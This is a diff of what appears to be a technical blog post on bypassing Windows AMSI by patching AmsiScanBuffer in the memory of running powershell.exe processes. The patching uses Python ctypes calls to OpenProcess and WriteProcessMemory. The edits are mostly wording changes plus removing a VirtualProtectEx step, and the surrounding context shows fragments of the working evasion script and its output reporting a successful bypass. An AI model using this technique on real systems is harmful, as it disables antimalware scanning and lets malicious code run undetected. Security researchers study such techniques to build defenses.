@@ -310,6 +310,8 @@ for pid in getPowershellPids():
         print(cPath.value.decode())
 ```
 
+And try it:
+
 ```powershell
 PS C:\Users\aroldan> python3 .\enummodules.py
 [+] Got process handle of PID powershell at 9936: 0x430
@@ -397,7 +399,7 @@ won't give accurate results.
 
 After a little research, I found that the way to
 get all the loaded modules of a running process
-was using `CreateToolhelp32Snapshot()` which creates an
+was using `CreateToolhelp32Snapshot()` which creates a
 snapshot of a process, including heaps, modules and
 threads. We can use that API to get the loaded modules
 along with the resolved base address of each module in the
@@ -451,6 +453,8 @@ for pid in getPowershellPids():
         ret = KERNEL32.Module32Next(snapshotHandle , pointer(me32))
 
 ```
+
+And run it:
 
 ```powershell
 PS C:\Users\aroldan> python3 .\enummodules.py
@@ -523,9 +527,9 @@ amsi!AmsiScanBuffer:
 00007ffd`4c278274 4883ec70        sub     rsp,70h
 ```
 
-Using the opened handle of the process, we need
-to find those instructions in the memory of
-the `powershell.exe` processes.
+Using the opened handle, we need to find those
+instructions in the memory of the `powershell.exe`
+process.
 
 First, we need to write down those bytes in
 a variable:
@@ -633,11 +637,6 @@ with the patching:
 def writeBuffer(handle, address, buffer):
     nBytes = c_int(0)
     KERNEL32.WriteProcessMemory.argtypes = [c_ulong, c_void_p, c_void_p, c_ulong, c_void_p]
-    KERNEL32.VirtualProtectEx.argtypes = [c_ulong, c_void_p, c_size_t, c_ulong, c_void_p]
-
-    res = KERNEL32.VirtualProtectEx(handle, address, len(buffer), PAGE_READWRITE, byref(c_ulong()))
-    if not res:
-        print(f'[-] VirtualProtectEx Error: {KERNEL32.GetLastError()}')
     res = KERNEL32.WriteProcessMemory(handle, address, buffer, len(buffer), byref(nBytes))
     if not res:
         print(f'[-] WriteProcessMemory Error: {KERNEL32.GetLastError()}')
@@ -646,11 +645,8 @@ def writeBuffer(handle, address, buffer):
 
 It will take the process handle, the address
 of `AmsiScanBuffer` we discovered and the
-patching payload. It will first change the
-memory page protection to `PAGE_READWRITE`
-because by default it has read-only permissions.
-Then, using `WriteProcessMemory()` it will
-patch `AmsiScanBuffer` with our instructions.
+patching payload. Then, using `WriteProcessMemory()`
+it will patch `AmsiScanBuffer` with our instructions.
 
 The relevant updated part of the script is now:
 
@@ -693,8 +689,8 @@ Great! `AMSI` successfully bypassed again. This
 time from a whole different process using
 cross-process memory patching.
 
-I rearranged the script adding some functions and
-the final script is this:
+This is the final script. I rearranged the script
+adding some functions for better readability:
 
 ```python
 #!/usr/bin/env python3
@@ -741,11 +737,6 @@ def readBuffer(handle, baseAddress, AmsiScanBuffer):
 def writeBuffer(handle, address, buffer):
     nBytes = c_int(0)
     KERNEL32.WriteProcessMemory.argtypes = [c_ulong, c_void_p, c_void_p, c_ulong, c_void_p]
-    KERNEL32.VirtualProtectEx.argtypes = [c_ulong, c_void_p, c_size_t, c_ulong, c_void_p]
-
-    res = KERNEL32.VirtualProtectEx(handle, address, len(buffer), PAGE_READWRITE, byref(c_ulong()))
-    if not res:
-        print(f'[-] VirtualProtectEx Error: {KERNEL32.GetLastError()}')
     res = KERNEL32.WriteProcessMemory(handle, address, buffer, len(buffer), byref(nBytes))
     if not res:
         print(f'[-] WriteProcessMemory Error: {KERNEL32.GetLastError()}')
@@ -807,7 +798,7 @@ for pid in getPowershellPids():
     process_handle = KERNEL32.OpenProcess(PROCESS_ACCESS, False, pid)
     if not process_handle:
         continue
-    print(f'[+] Got process handle of PID powershell at {pid}: {hex(process_handle)}')
+    print(f'[+] Got process handle of powershell at {pid}: {hex(process_handle)}')
     print(f'[+] Trying to find AmsiScanBuffer in {pid} process memory...')
     amsiDllBaseAddress = getAmsiDllBaseAddress(process_handle, pid)
     if not amsiDllBaseAddress:
